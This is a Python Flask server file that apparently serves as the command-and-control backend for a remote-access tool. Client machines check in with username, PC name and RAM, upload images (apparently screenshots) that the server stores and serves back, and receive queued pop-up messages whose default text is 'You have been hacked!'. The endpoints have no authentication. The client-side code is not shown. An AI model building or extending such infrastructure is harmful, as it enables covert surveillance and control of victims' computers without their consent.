from flask import Flask, jsonify, send_file, request
from datetime import datetime, timedelta
import threading
import os
import uuid

app = Flask(__name__)

clients = {}
clients_lock = threading.Lock()

# pending messages: (client, pc) -> list of {id, style, title, text}
messages = {}
messages_lock = threading.Lock()

TIMEOUT_SECONDS = 60
PHOTOS_DIR = "photos1"
os.makedirs(PHOTOS_DIR, exist_ok=True)

# ... cleanup_clients unchanged ...

@app.route("/sent/message/<client>/<pc>/", methods=["POST"])
def sent_message(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    payload = request.get_json(silent=True) or {}
    style = payload.get("style", "info")
    if style not in ("info", "warning", "error", "askokcancel"):
        style = "info"
    title = str(payload.get("title", "System Notification"))[:200]
    text = str(payload.get("text", "You have been hacked!"))[:2000]

    msg = {"id": uuid.uuid4().hex, "style": style,
           "title": title, "text": text}

    with messages_lock:
        messages.setdefault((client, pc), []).append(msg)

    return jsonify({"Succes": True, "id": msg["id"]})

@app.route("/message/<client>/<pc>/")
def get_message(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    with messages_lock:
        pending = messages.get((client, pc), [])
        if pending:
            msg = pending.pop(0)
            if not pending:
                messages.pop((client, pc), None)
            return jsonify({"Succes": True, "message": msg})

    return jsonify({"Succes": True, "message": None})

def cleanup_clients():
    now = datetime.utcnow()
    with clients_lock:
        for username in list(clients.keys()):
            for pc_name in list(clients[username].keys()):
                last_seen = clients[username][pc_name]["last_seen"]
                if now - last_seen > timedelta(seconds=TIMEOUT_SECONDS):
                    del clients[username][pc_name]
            if not clients[username]:
                del clients[username]

@app.route("/")
def index():
    return jsonify({"Succes": False, "Error": "Acces Denied"})

@app.route("/clients/")
def get_clients():
    cleanup_clients()
    result = {}
    with clients_lock:
        for username, pcs in clients.items():
            result[username] = {}
            for pc_name, data in pcs.items():
                result[username][pc_name] = {
                    "RAM": data["RAM"],
                    "last_seen": data["last_seen"].isoformat() + "Z",
                }
    return jsonify(result)

@app.route("/client/<client>/<pc>/")
def get_client(client, pc):
    cleanup_clients()
    return jsonify(clients.get(client, {}).get(pc, {"Succes": False}))

@app.route("/me/<username>/<pc_name>/<ram>")
def me(username, pc_name, ram):
    with clients_lock:
        if username not in clients:
            clients[username] = {}
        clients[username][pc_name] = {
            "RAM": ram,
            "last_seen": datetime.utcnow(),
        }
    return jsonify({"Succes": True, "username": username, "pc_name": pc_name, "RAM": ram})

@app.route("/photo1/<client>/<pc>/")
def photo1(client, pc):
    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    filepath = os.path.join(PHOTOS_DIR, f"{client}_{pc}.png")

    if os.path.exists(filepath):
        return send_file(filepath, mimetype="image/png")
    else:
        return jsonify({"Succes": False})

@app.route("/sent/photo1/<client>/<pc>/", methods=["POST"])
def sent_photo1(client, pc):

    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
        return jsonify({"Succes": False})

    data = None
    if request.files:
        for key in request.files:
            data = request.files[key].read()
            break
    if data is None:
        data = request.get_data()

    if not data:
        return jsonify({"Succes": False})

    os.makedirs(PHOTOS_DIR, exist_ok=True)
    filepath = os.path.join(PHOTOS_DIR, f"{client}_{pc}.png")

    tmp_path = filepath + ".tmp"
    try:
        with open(tmp_path, "wb") as f:
            f.write(data)
        os.replace(tmp_path, filepath)
    except Exception as e:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except OSError:
                pass
        return jsonify({"Succes": False})

    return jsonify({
        "Succes": True,
        "client": client,
        "pc": pc,
        "size": len(data),
    })

if __name__ == "__main__":
    app.run(debug=True)
